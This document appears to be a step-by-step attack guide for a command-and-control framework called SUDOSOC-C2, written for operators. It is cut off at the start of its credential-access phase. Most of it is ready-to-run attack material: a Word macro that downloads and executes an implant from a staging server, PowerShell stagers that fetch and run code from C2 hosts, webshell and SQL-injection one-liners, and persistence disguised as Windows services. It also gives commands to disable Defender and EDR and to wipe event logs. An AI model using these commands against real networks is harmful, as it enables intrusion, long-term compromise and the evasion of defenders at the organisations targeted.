# Suggested Hacking Steps
## SUDOSOC-C2 — Complete Attack Lifecycle Guide

```
███████╗██╗   ██╗██████╗  ██████╗ ███████╗ ██████╗  ██████╗     ██████╗██████╗
██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚════██╗
███████╗██║   ██║██║  ██║██║   ██║███████╗██║   ██║██║         ██║      █████╔╝
╚════██║██║   ██║██║  ██║██║   ██║╚════██║██║   ██║██║         ██║     ██╔═══╝
███████║╚██████╔╝██████╔╝╚██████╔╝███████║╚██████╔╝╚██████╗    ╚██████╗███████╗
╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝     ╚═════╝╚══════╝
```

> **From zero knowledge to complete domain domination — every step, every command, every outcome.**
>
> Author: Seif (@sudosoc) | Version: v2.0.0 | 2026

---

## Attack Lifecycle Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      COMPLETE ATTACK LIFECYCLE                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PHASE 0      ──►  PHASE 1    ──►  PHASE 2    ──►  PHASE 3                │
│  Pre-Attack       Initial         Foothold         Discovery               │
│  Preparation      Access          & Persistence    & Enumeration           │
│                                                                             │
│  PHASE 4      ──►  PHASE 5    ──►  PHASE 6    ──►  PHASE 7                │
│  Privilege        Defense         Credential       Lateral                 │
│  Escalation       Evasion         Access           Movement                │
│                                                                             │
│  PHASE 8      ──►  PHASE 9    ──►  PHASE 10   ──►  PHASE 11               │
│  Active           Advanced        Collection &     Covering                │
│  Directory        Persistence     Exfiltration     Tracks                  │
│  Domination       (Hardware)                                               │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Table of Contents

- [Phase 0 — Pre-Attack Preparation](#phase-0--pre-attack-preparation)
- [Phase 1 — Initial Access](#phase-1--initial-access)
- [Phase 2 — Establishing Foothold & Persistence](#phase-2--establishing-foothold--persistence)
- [Phase 3 — Discovery & Enumeration](#phase-3--discovery--enumeration)
- [Phase 4 — Privilege Escalation](#phase-4--privilege-escalation)
- [Phase 5 — Defense Evasion](#phase-5--defense-evasion)
- [Phase 6 — Credential Access](#phase-6--credential-access)
- [Phase 7 — Lateral Movement](#phase-7--lateral-movement)
- [Phase 8 — Active Directory Domination](#phase-8--active-directory-domination)
- [Phase 9 — Hardware-Level Persistence](#phase-9--hardware-level-persistence)
- [Phase 10 — Collection & Exfiltration](#phase-10--collection--exfiltration)
- [Phase 11 — Covering Your Tracks](#phase-11--covering-your-tracks)
- [Complete Attack Scenario](#complete-attack-scenario)
- [Decision Trees](#decision-trees)

---

## Phase 0 — Pre-Attack Preparation

> **Goal:** Build your infrastructure, set up C2 server, prepare payloads, and conduct passive reconnaissance before touching the target.
> **Risk Level:** Zero — no contact with the target yet.

---

### 0.1 — Infrastructure Setup

#### What it is
Your C2 infrastructure is the backbone of the entire operation. A poorly configured infrastructure can expose your identity, kill your operation mid-stream, or get your payloads blocked before they reach anyone.

#### Goal
Stand up a resilient, anonymous, multi-channel C2 infrastructure that can survive listener take-downs, network blocking, and attribution attempts.

#### Recommended Architecture

```
[Your Machine]
      │
      │ (encrypted, operator config)
      ▼
[VPS / Cloud Server — C2 Server]      ← sudosoc-server runs here
      │           │          │
      │           │          │
   mTLS        HTTPS        DNS
  :8888         :443         :53
      │           │          │
      ▼           ▼          ▼
[Redirector 1] [CDN Front] [DNS Auth]  ← hides the real C2 IP
      │           │          │
      └─────┬─────┘          │
            ▼                ▼
        [TARGET NETWORK]
```

#### Step-by-Step Setup

**Step 1 — Provision and harden your server**
```bash
# On your VPS (Ubuntu/Debian)
# Update and harden
apt update && apt upgrade -y
apt install ufw fail2ban -y

# Firewall — only allow C2 ports
ufw default deny incoming
ufw allow 22/tcp    # SSH (change to non-standard port)
ufw allow 8888/tcp  # mTLS
ufw allow 443/tcp   # HTTPS
ufw allow 53/udp    # DNS
ufw allow 47443/tcp # Multiplayer
ufw enable

# Change SSH port
sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
systemctl restart sshd
```

**Step 2 — Install and start SUDOSOC-C2 server**
```bash
# Transfer binary to server
scp -P 2222 sudosoc-server user@your-vps:/opt/sudosoc/

# Create systemd service for persistence
cat > /etc/systemd/system/sudosoc.service << EOF
[Unit]
Description=SUDOSOC-C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/sudosoc
ExecStart=/opt/sudosoc/sudosoc-server daemon --lhost 0.0.0.0 --lport 47443
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sudosoc
systemctl start sudosoc
```

**Step 3 — Configure DNS for DNS C2**
```
On your DNS provider, add:
  A record:    c2.sudosoc.com    →  YOUR_VPS_IP
  NS record:   dns.sudosoc.com   →  c2.sudosoc.com
  A record:    dns.sudosoc.com   →  YOUR_VPS_IP
```

**Step 4 — Create operator profiles**
```bash
# SSH into server
# Connect to the server console
./sudosoc-client --config /opt/sudosoc/sudosoc.cfg

# Create multiplayer listener
sudosoc [server] > multiplayer --lhost 0.0.0.0 --lport 47443

# Generate operator config for yourself
sudosoc [server] > new-operator --name seif --lhost YOUR_VPS_IP

# Copy the generated config to your machine
scp -P 2222 user@your-vps:/root/seif_VPS_IP.cfg ~/.sudosoc/configs/
```

#### What You Gain After This Step
- ✅ Full C2 server running on a remote VPS
- ✅ Your real IP hidden behind redirectors
- ✅ Multiple C2 channels available as fallback
- ✅ Operator authentication configured

---

### 0.2 — Passive Reconnaissance

#### What it is
Gathering intelligence about the target without ever sending a single packet to them. Uses only publicly available information (OSINT).

#### Goal
Build a complete picture of the target: their technology stack, employees, email format, external infrastructure, and potential attack vectors — all before touching anything.

#### Tools and Sources

**Company & Technology Profile**
```bash
# Shodan — discover internet-facing infrastructure
shodan search "org:TargetCompany"
shodan search "ssl.cert.subject.cn:targetcompany.com"

# Find subdomains
subfinder -d targetcompany.com -all -o subdomains.txt
amass enum -passive -d targetcompany.com -o domains.txt

# DNS information
dnsx -l subdomains.txt -a -aaaa -cname -mx -txt -o dns_results.txt

# Technology detection
httpx -l subdomains.txt -tech-detect -status-code -title -o web_tech.txt

# Check for exposed services
nmap -sV --script=banner -iL ip_list.txt -oA nmap_external
```

**Employee & Email Harvesting**
```bash
# Email format discovery
theHarvester -d targetcompany.com -b all -f harvest_results

# LinkedIn enumeration (for employee names and roles)
# Note targeted employees: IT staff, sysadmins, HR (phishing targets)

# Email validation
emailhippo api validate employee@targetcompany.com

# Common email formats to test:
# firstname.lastname@company.com
# f.lastname@company.com
# firstnamelastname@company.com
```

**Leaked Credentials Search**
```bash
# Check HaveIBeenPwned API
curl "https://haveibeenpwned.com/api/v3/breachedaccount/user@targetcompany.com" \
  -H "hibp-api-key: YOUR_KEY"

# Check dehashed.com for leaked passwords
# Check pastebin/github for leaked configs
trufflehog github --org=targetcompany --only-verified
```

**Infrastructure Mapping**
```bash
# ASN lookup
whois -h whois.cymru.com " -v 1.2.3.4"

# Reverse IP — find all domains on same IP
curl "https://api.hackertarget.com/reverseiplookup/?q=TARGET_IP"

# SSL certificate transparency (find all subdomains)
curl "https://crt.sh/?q=%.targetcompany.com&output=json" | jq '.[].name_value' | sort -u

# Web Archive — see old versions/configs
curl "http://web.archive.org/cdx/search/cdx?url=*.targetcompany.com&output=text&fl=original&collapse=urlkey"
```

#### What You Gain After This Step
- ✅ Complete map of target's external attack surface
- ✅ Employee names, roles, and email addresses
- ✅ Technology stack (VPN type, email provider, AV/EDR)
- ✅ Potential leaked credentials
- ✅ Identified phishing targets (IT staff, executives, HR)
- ✅ Entry points ranked by likelihood of success

---

### 0.3 — Pre-Attack Payload Preparation

#### What it is
Designing your payloads before the operation. Choosing the right C2 channel, evasion settings, and format based on your recon data.

#### Decision Framework

```
What do you know about the target network?

Is outbound HTTPS allowed?
  YES → Use HTTPS C2 with malleable profile
  NO  → Is outbound DNS allowed?
         YES → Use DNS-over-HTTPS C2
         NO  → You likely need physical access (SMB pivot)

Does the target use an EDR?
  YES → Enable --evasion, --skip-symbols, use Beacon mode
  NO  → Session mode is fine

What delivery method will you use?
  Phishing email  → EXE or macro-embedded document
  USB drop        → EXE or LNK file
  Web exploit     → Shellcode
  Supply chain    → DLL
```

**Prepare Phishing Payloads**
```bash
# Standard stealth implant
sudosoc > generate \
  --https c2.sudosoc.com:443 \
  --dns dns.sudosoc.com \
  --os windows \
  --arch amd64 \
  --format exe \
  --name "AdobeUpdate" \
  --skip-symbols \
  --evasion \
  --reconnect 60 \
  --limit-datetime "2026-12-31" \
  --save /tmp/payloads/

# Beacon for long-term operations (less noisy)
sudosoc > generate beacon \
  --https c2.sudosoc.com:443 \
  --os windows \
  --arch amd64 \
  --seconds 120 \
  --jitter 40 \
  --skip-symbols \
  --evasion \
  --save /tmp/payloads/

# Shellcode for process injection
sudosoc > generate \
  --mtls c2.sudosoc.com:8888 \
  --os windows \
  --format shellcode \
  --evasion \
  --save /tmp/payloads/

# Save as reusable profile
sudosoc > profiles new \
  --name "corp-phish" \
  --https c2.sudosoc.com:443 \
  --dns dns.sudosoc.com \
  --os windows \
  --skip-symbols \
  --evasion \
  --seconds 120 \
  --jitter 40
```

#### What You Gain After This Step
- ✅ Ready-to-deploy payloads optimized for the target environment
- ✅ Fallback payloads for different scenarios
- ✅ Saved profiles for quick regeneration if payloads are burned

---

## Phase 1 — Initial Access

> **Goal:** Get your implant running on at least one machine inside the target network.
> **MITRE ATT&CK:** T1566 (Phishing), T1195 (Supply Chain), T1189 (Drive-by)

---

### 1.1 — Spear Phishing Attack

#### What it is
A highly targeted email attack crafted specifically for the chosen victim, referencing real context from your OSINT to increase believability.

#### Goal
Trick a specific employee into executing your implant.

#### Step-by-Step

**Step 1 — Choose your target**
```
Priority targets (in order):
1. IT Helpdesk / Sysadmin    ← Usually has SYSTEM rights already
2. Finance/HR employees       ← Often targeted with invoice lures
3. Executives (C-suite)       ← High privileges, often less security training
4. Contractors/vendors        ← Weaker security posture, same network access
```

**Step 2 — Craft the lure**
```
Effective lure types:
  "Password expiry notice" → Link to fake VPN login page
  "Invoice attached" → Macro-embedded Word document  
  "IT: Please update your certificate" → EXE download
  "Shared document" → Fake OneDrive/SharePoint link → EXE
  "Urgent payroll correction needed" → Macro document
```

**Step 3 — Embed payload in document (if using macros)**
```vba
' Word macro that downloads and executes your payload
Sub AutoOpen()
    Dim url As String
    Dim localPath As String
    url = "https://your-staging-server.com/AdobeUpdate.exe"
    localPath = Environ("TEMP") & "\AdobeUpdate.exe"
    
    Dim xhr As Object
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", url, False
    xhr.Send
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write xhr.responseBody
    stream.SaveToFile localPath, 2
    stream.Close
    
    Shell localPath
End Sub
```

**Step 4 — Send the phishing email**
```bash
# Using GoPhish for campaign management
# Or manual send via controlled mail server

# The email should:
# - Come from a spoofed/convincing domain
# - Have proper SPF/DKIM to bypass spam filters
# - Reference real context (company name, employee name, real projects)
# - Create urgency without being suspicious
```

**Step 5 — Monitor for callbacks**
```bash
# Start your listeners before sending
sudosoc > https --lhost 0.0.0.0 --lport 443
sudosoc > dns --domains dns.sudosoc.com

# Watch for incoming sessions
sudosoc > sessions
# [*] Session a3f29b1c opened - CORP\jsmith@WORKSTATION-01 (192.168.10.50)
```

#### What You Gain After This Step
- ✅ **Active session** inside the target network
- ✅ **User-level access** (usually a standard domain user)
- ✅ **A foothold** inside the network perimeter
- ✅ You can now see the internal network from inside

---

### 1.2 — Physical Access / USB Drop

#### What it is
Dropping a malicious USB drive in the target's parking lot, lobby, or mailing a package to a specific employee.

#### Goal
Get someone to plug in the USB and execute your payload, bypassing email security gateways entirely.

#### Preparation
```bash
# Create a lure EXE with a compelling name
sudosoc > generate \
  --mtls c2.sudosoc.com:8888 \
  --os windows \
  --name "Q3_Salary_Review_2026" \
  --skip-symbols \
  --evasion \
  --save /tmp/

# Optional: Use a LNK (shortcut) file that executes the payload
# LNK files execute on single-click without UAC prompt
```

**AutoRun approach (Windows 7 and older)**
```
Create autorun.inf on USB:
[autorun]
open=payload.exe
label=USB Drive
icon=folder.ico
```

**LNK file approach (modern Windows)**
```
Target: C:\Windows\System32\cmd.exe /c start payload.exe
Icon: %SystemRoot%\system32\shell32.dll,3  ← folder icon
Name: Financial Reports Q3 2026
```

#### What You Gain After This Step
- ✅ Access completely bypasses email security
- ✅ Often gets SYSTEM-level access if plugged by IT staff
- ✅ No network logs until the payload calls back

---

### 1.3 — Web Application Exploitation

#### What it is
If the target has external web applications, exploit vulnerabilities to execute your payload on the web server.

#### Goal
Get code execution on a target server, which often has elevated access to the internal network.

#### Common Attack Paths
```bash
# File upload vulnerability
# Upload a web shell, then download and execute the implant
curl -F "file=@webshell.aspx" https://target.com/upload

# Once webshell is up:
# Execute PowerShell to download and run implant
# ?cmd=powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://c2/r')"

# SQL injection with xp_cmdshell
# '; EXEC xp_cmdshell 'powershell -c "IEX(iwr c2.com/r)"'; --

# Deserialization
# Use ysoserial to generate payload that downloads and executes implant
```

**PowerShell one-liner stager**
```powershell
# Host this on your staging server (not C2)
# This downloads and executes the implant in memory

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0")
$bytes = $wc.DownloadData("https://staging.com/update.bin")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, $null)
```

#### What You Gain After This Step
- ✅ Access to a **server** (often more privileged than workstations)
- ✅ Potential **local admin or SYSTEM** on the web server
- ✅ Server is often on multiple network segments (DMZ + internal)

---

## Phase 2 — Establishing Foothold & Persistence

> **Goal:** Ensure your access survives reboots, logoffs, AV scans, and initial incident response.
> **MITRE ATT&CK:** T1547, T1543, T1053, T1546

---

### 2.1 — Verify and Stabilize Your Session

#### What it is
Before doing anything else, understand exactly what you have and stabilize the connection.

```bash
# Check what you have
sudosoc (session) > whoami
# Output: CORP\jsmith

sudosoc (session) > getprivs
# Key privileges to look for:
# SeImpersonatePrivilege    → Can impersonate SYSTEM (Potato attacks)
# SeDebugPrivilege          → Can access any process memory
# SeLoadDriverPrivilege     → Can load kernel drivers
# SeTakeOwnershipPrivilege  → Can take ownership of any file
# SeAssignPrimaryToken      → Alternative path to SYSTEM

sudosoc (session) > info
# Shows: OS version, hostname, domain, architecture, PID

sudosoc (session) > ps
# Look for: security products (Defender, CrowdStrike, etc.)
# Look for: interesting processes (lsass, MSSQL, domain-related)
```

**Check for security products**
```bash
sudosoc (session) > execute "sc query type= all | findstr /I 'defender crowdstrike sentinel cylance'
sudosoc (session) > execute "wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname"
sudosoc (session) > execute "netsh advfirewall show allprofiles state"
```

---

### 2.2 — Establish Persistence (OS-Level)

#### What it is
Multiple redundant persistence mechanisms ensure that even if one is discovered and removed, others remain.

#### Goal
Guarantee your access survives as many remediation attempts as possible.

**Method A — Registry Run Key (User-Level)**
```bash
sudosoc (session) > execute "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d \"C:\Users\Public\Libraries\svcupdate.exe\" /f"

# Copy implant to a less suspicious location first
sudosoc (session) > upload /tmp/payload.exe C:\Users\Public\Libraries\svcupdate.exe

# Verify
sudosoc (session) > execute "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Method B — Scheduled Task (Survives logoff)**
```bash
sudosoc (session) > execute "schtasks /create /tn \"MicrosoftEdgeUpdateBrowserReplace\" /tr \"C:\ProgramData\MicrosoftUpdate\svc.exe\" /sc onlogon /ru SYSTEM /f"

# More stealthy — trigger on system events, not just login
sudosoc (session) > execute "schtasks /create /tn \"WindowsTelemetrySync\" /tr \"C:\ProgramData\MicrosoftUpdate\svc.exe\" /sc onidle /i 5 /f"
```

**Method C — Windows Service (SYSTEM rights, auto-start)**
```bash
sudosoc (session) > upload /tmp/payload.exe C:\Windows\System32\spool\drivers\color\svchostd.exe

sudosoc (session) > execute "sc create WindowsFontService binPath= \"C:\Windows\System32\spool\drivers\color\svchostd.exe\" start= auto DisplayName= \"Windows Font Service\" type= own"

sudosoc (session) > execute "sc description WindowsFontService \"Provides font rendering and cache management.\""

sudosoc (session) > execute "sc start WindowsFontService"
```

**Method D — WMI Event Subscription (Most stealthy)**
```bash
# WMI persistence is the hardest to find — doesn't appear in autoruns
sudosoc (session) > execute "powershell -c \"
\$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='MsftUpdate'
  EventNamespace='root\cimv2'
  QueryLanguage='WQL'
  Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"
}
\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name='MsftUpdate'
  CommandLineTemplate='C:\ProgramData\Microsoft\svc.exe'
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
  Filter=\$Filter
  Consumer=\$Consumer
}\""
```

**Method E — DLL Hijacking (Blends into legitimate processes)**
```bash
# First, identify processes vulnerable to DLL hijacking
sudosoc (session) > execute "powershell -c \"Get-WmiObject Win32_Process | Select-Object Name,ExecutablePath\""

# Generate a DLL payload
sudosoc > generate --mtls c2.sudosoc.com --os windows --format shared --name "version" --save /tmp/

# Drop in a location that a legitimate app will load it from
sudosoc (session) > upload /tmp/version.dll "C:\Program Files\SomeApp\version.dll"
# Next time the app starts → your DLL loads → implant executes
```

#### What You Gain After This Step
- ✅ Your access **survives reboots** (multiple methods)
- ✅ Your access **survives user logoff**
- ✅ Multiple redundant persistence points
- ✅ Even if one is found, others remain active

---

## Phase 3 — Discovery & Enumeration

> **Goal:** Map the entire network, find high-value targets, and identify the most efficient path to your objectives.
> **MITRE ATT&CK:** T1016, T1018, T1069, T1087, T1482

---

### 3.1 — Local System Enumeration

#### What it is
Understanding exactly where you are and what resources are available on the compromised machine.

```bash
# Full system profile
sudosoc (session) > execute "systeminfo"
# Reveals: OS version, hotfixes, domain, logon server, RAM, network cards

# Current user and privileges
sudosoc (session) > execute "whoami /all"
# Shows: username, SID, group memberships, all privileges

# Logged-in users (other sessions on this machine)
sudosoc (session) > execute "query user"
# If other users are logged in → steal their tokens later

# Running processes with full paths
sudosoc (session) > execute "wmic process get caption,executablepath,commandline"
# Look for: credentials in command lines, interesting apps, AV products

# Installed software
sudosoc (session) > execute "wmic product get name,version"

# Recent files (may contain passwords or sensitive data)
sudosoc (session) > execute "dir /s /b %APPDATA%\Microsoft\Windows\Recent"

# Check for stored credentials in common locations
sudosoc (session) > execute "cmdkey /list"
# Lists stored Windows credentials (RDP, network shares, etc.)

# Check credential manager
sudosoc (session) > execute "vaultcmd /listcreds:\"Windows Credentials\" /all"

# Browser saved passwords
sudosoc (session) > execute "dir /s \"%APPDATA%\Mozilla\Firefox\Profiles\""
sudosoc (session) > execute "dir /s \"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data\""
```

---

### 3.2 — Network Enumeration

#### What it is
Mapping the internal network — finding other machines, open services, and network architecture.

```bash
# Your IP and network info
sudosoc (session) > execute "ipconfig /all"
# Note: all network adapters — maybe there's a second network

# ARP table (machines you've recently communicated with)
sudosoc (session) > execute "arp -a"
# This gives you live hosts in your subnet with zero noise

# Routing table — understand network segmentation
sudosoc (session) > execute "route print"

# DNS resolution — find server names
sudosoc (session) > execute "nslookup -type=any _ldap._tcp.corp.local"
# Reveals: Domain Controllers, site names, etc.

# NetBIOS names in the network
sudosoc (session) > execute "nbtstat -n"
sudosoc (session) > execute "net view"

# Find Domain Controllers specifically
sudosoc (session) > execute "nltest /dclist:corp.local"

# SMB shares visible
sudosoc (session) > execute "net view /all /domain"

# Port scan using just built-in Windows tools (no nmap needed)
sudosoc (session) > execute "powershell -c \"1..254 | ForEach-Object { \$ip = '192.168.1.' + \$_; if (Test-Connection \$ip -Count 1 -Quiet -TimeoutSeconds 1) { Write-Host \$ip } }\""

# Set up SOCKS5 proxy for full network access from your machine
sudosoc (session) > socks5 start --port 1080
# Now from your machine:
# proxychains nmap -sV --open 192.168.1.0/24 -p 22,80,443,445,3389,1433,5432 -T4
```

---

### 3.3 — Active Directory Enumeration

#### What it is
Mapping the entire AD environment — users, groups, computers, GPOs, trusts, and permissions.

```bash
# Current domain info
sudosoc (session) > execute "net user /domain"
sudosoc (session) > execute "net group /domain"
sudosoc (session) > execute "nltest /domain_trusts"

# Find all Domain Admins
sudosoc (session) > execute "net group \"Domain Admins\" /domain"

# Find all computers in domain
sudosoc (session) > execute "net group \"Domain Computers\" /domain"

# PowerShell AD enumeration (if AD PowerShell module available)
sudosoc (session) > execute "powershell -c \"Get-ADUser -Filter * -Properties * | Select-Object Name,SamAccountName,Enabled,LastLogonDate,PasswordLastSet,MemberOf | Export-Csv C:\Temp\users.csv\""
sudosoc (session) > download C:\Temp\users.csv /tmp/

# GPO enumeration
sudosoc (session) > execute "powershell -c \"Get-GPO -All | Select-Object DisplayName,GpoStatus | Format-Table\""

# Find accounts with Kerberos pre-auth disabled (AS-REP Roasting targets)
sudosoc (session) > execute "powershell -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$true} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName\""

# Find accounts with SPNs (Kerberoasting targets)
sudosoc (session) > execute "powershell -c \"Get-ADUser -Filter {ServicePrincipalName -ne '\$null'} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName\""

# Find accounts in protected groups
sudosoc (session) > execute "powershell -c \"Get-ADGroupMember 'Protected Users' -Recursive | Select-Object Name,SamAccountName\""

# BloodHound data collection (via SOCKS proxy)
# proxychains bloodhound-python -d corp.local -u jsmith -p password123 -gc dc01.corp.local -c all
# Then analyze the .json files in BloodHound for attack paths
```

**Via SOCKS5 Proxy with remote tools**
```bash
# After: sudosoc (session) > socks5 start --port 1080

# LDAP enumeration
proxychains ldapsearch -H ldap://dc01.corp.local -x -b "DC=corp,DC=local" "(objectClass=user)" cn sAMAccountName

# CrackMapExec for bulk enumeration
proxychains crackmapexec smb 192.168.1.0/24 --users
proxychains crackmapexec smb 192.168.1.0/24 --shares
proxychains crackmapexec smb 192.168.1.0/24 --pass-pol

# Enumerate ADCS (Certificate Services — major attack vector)
proxychains certipy find -u jsmith@corp.local -p password123 -dc-ip 192.168.1.5 -text
```

#### What You Gain After This Step
- ✅ Complete map of the internal network
- ✅ List of all Domain Admins and their workstations
- ✅ List of all servers and their services
- ✅ Identified Kerberoasting targets
- ✅ Identified AS-REP Roasting targets
- ✅ Domain trust relationships mapped
- ✅ Clear understanding of attack paths

---

## Phase 4 — Privilege Escalation

> **Goal:** Elevate from a standard user to SYSTEM or Domain Admin.
> **MITRE ATT&CK:** T1068, T1055, T1134, T1548

---

### 4.1 — Local Privilege Escalation to SYSTEM

#### What it is
Elevating your current user-level access to NT AUTHORITY\SYSTEM, the highest privilege level on a Windows machine.

**Method A — Token Impersonation (Best if SeImpersonatePrivilege is available)**

```bash
# Check for the privilege first
sudosoc (session) > execute "whoami /priv | findstr /i impersonate"
# If: SeImpersonatePrivilege → Enabled

# Use getsystem
sudosoc (session) > getsystem
# [*] NT AUTHORITY\SYSTEM ← success

# Verify
sudosoc (session) > execute "whoami"
# nt authority\system
```

**Method B — PrintSpoofer (SeImpersonatePrivilege)**

```bash
# If getsystem doesn't work, try PrintSpoofer
sudosoc (session) > upload /opt/tools/PrintSpoofer64.exe C:\Temp\PrintSpoofer64.exe
sudosoc (session) > execute "C:\Temp\PrintSpoofer64.exe -i -c cmd"
# Opens SYSTEM shell
```

**Method C — JuicyPotatoNG / GodPotato**

```bash
sudosoc (session) > upload /opt/tools/GodPotato-NET4.exe C:\Temp\GP.exe

# Execute payload as SYSTEM
sudosoc (session) > execute "C:\Temp\GP.exe -cmd \"cmd /c C:\Temp\payload.exe\""
```

**Method D — Unquoted Service Path**

```bash
# Find vulnerable services
sudosoc (session) > execute "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\windows\""

# Example: C:\Program Files\My App\service.exe
# Windows will try: C:\Program.exe first (if exists and writable)
sudosoc (session) > upload /tmp/payload.exe "C:\Program Files\payload.exe"
sudosoc (session) > execute "sc stop VulnerableService && sc start VulnerableService"
```

**Method E — Kernel Exploits (Last resort)**

```bash
# Check OS version and missing patches
sudosoc (session) > execute "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Hotfix\""

# Use WES-NG to find missing patches → kernel exploits
# windows-exploit-suggester.py --database 2026-01-01-mssb.xls --systeminfo sysinfo.txt
```

#### What You Gain After This Step
- ✅ **Full control** over the compromised machine
- ✅ Can **read/write any file** on the system
- ✅ Can **access LSASS** memory for credential dumping
- ✅ Can **install kernel drivers** (BYOVD, rootkits)
- ✅ Can **disable security software**

---

### 4.2 — UAC Bypass

#### What it is
Even with a local admin account, Windows User Account Control (UAC) may block certain operations. This bypasses it.

```bash
# Method 1: fodhelper.exe UAC bypass
sudosoc (session) > execute "powershell -c \"
\$a = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Path \$a -Force
Set-ItemProperty -Path \$a -Name '(Default)' -Value 'C:\Temp\payload.exe' -Force
Set-ItemProperty -Path \$a -Name 'DelegateExecute' -Value '' -Force
Start-Process 'C:\Windows\System32\fodhelper.exe'
\""

# Method 2: Computerdefaults.exe
sudosoc (session) > execute "powershell -c \"
\$a = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Path \$a -Force
Set-ItemProperty -Path \$a -Name '(Default)' -Value 'cmd.exe /c C:\Temp\payload.exe' -Force
Set-ItemProperty -Path \$a -Name 'DelegateExecute' -Value '' -Force
Start-Process 'C:\Windows\System32\computerdefaults.exe'
\""
```

#### What You Gain After This Step
- ✅ High-integrity process execution (bypasses UAC)
- ✅ Can now perform operations that require elevation
- ✅ Path to SYSTEM via additional techniques

---

## Phase 5 — Defense Evasion

> **Goal:** Neutralize security products and prevent detection of your activities.
> **MITRE ATT&CK:** T1562, T1070, T1027, T1055

---

### 5.1 — Disable Windows Defender

#### What it is
After gaining SYSTEM, disabling Windows Defender to prevent payload detection.

```bash
# Verify you have SYSTEM
sudosoc (session) > execute "whoami"
# nt authority\system

# Disable real-time monitoring
sudosoc (session) > execute "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring \$true\""

# Disable all Defender features
sudosoc (session) > execute "powershell -c \"
Set-MpPreference -DisableRealtimeMonitoring \$true
Set-MpPreference -DisableBehaviorMonitoring \$true
Set-MpPreference -DisableBlockAtFirstSeen \$true
Set-MpPreference -DisableIOAVProtection \$true
Set-MpPreference -DisablePrivacyMode \$true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine \$true
Set-MpPreference -DisableArchiveScanning \$true
Set-MpPreference -DisableIntrusionPreventionSystem \$true
Set-MpPreference -DisableScriptScanning \$true
Set-MpPreference -SubmitSamplesConsent 2
\""

# Disable Defender via registry (persists across reboots)
sudosoc (session) > execute "reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"

# Add exclusion path
sudosoc (session) > execute "powershell -c \"Add-MpPreference -ExclusionPath 'C:\Temp'; Add-MpPreference -ExclusionPath 'C:\ProgramData'\""
```

---

### 5.2 — Disable EDR (Third-Party)

#### What it is
For environments running CrowdStrike, SentinelOne, or similar products, use BYOVD to terminate their kernel processes.

```bash
# Step 1: Identify the EDR product
sudosoc (session) > execute "sc query type= all | findstr /I \"crowdstrike sentinel cylance carbon\"

# Step 2: Use BYOVD to get kernel access
sudosoc (session) > upload /opt/drivers/RTCore64.sys C:\Windows\Temp\drv.sys
sudosoc (session) > byovd --local-driver /opt/drivers/RTCore64.sys --action full

# After kernel access, the EDR driver can be unloaded:
sudosoc (session) > execute "fltMC unload csagent"   # CrowdStrike
sudosoc (session) > execute "fltMC unload SentinelMonitor"  # SentinelOne
```

---

### 5.3 — Disable Event Logging

#### What it is
Preventing Windows from logging your activities to Event Viewer and SIEM systems.

```bash
# Disable Windows Event Log service
sudosoc (session) > execute "sc stop EventLog"
sudosoc (session) > execute "sc config EventLog start= disabled"

# Clear existing logs (do this AFTER disabling logging)
sudosoc (session) > execute "wevtutil cl System"
sudosoc (session) > execute "wevtutil cl Security"
sudosoc (session) > execute "wevtutil cl Application"

# Disable Sysmon specifically (if deployed)
sudosoc (session) > execute "sc stop Sysmon64"
sudosoc (session) > execute "sc delete Sysmon64"

# Disable PowerShell logging
sudosoc (session) > execute "reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
sudosoc (session) > execute "reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\" /v EnableModuleLogging /t REG_DWORD /d 0 /f"

# Disable Windows Firewall logging
sudosoc (session) > execute "netsh advfirewall set allprofiles logging droppedconnections disable"
sudosoc (session) > execute "netsh advfirewall set allprofiles logging allowedconnections disable"
```

#### What You Gain After This Step
- ✅ Your actions are **no longer logged** to Windows Event Log
- ✅ SIEM receives **no alerts** about your activities
- ✅ EDR kernel driver **unloaded** — no real-time behavioral monitoring
- ✅ Future operations on this machine are **nearly invisible**

---

## Phase 6 — Credential Access

> **Goal:** Extract passwords, hashes, and Kerberos tickets from the system to enable lateral movement.
> **MITRE ATT&CK:** T1003, T1558, T1552

---

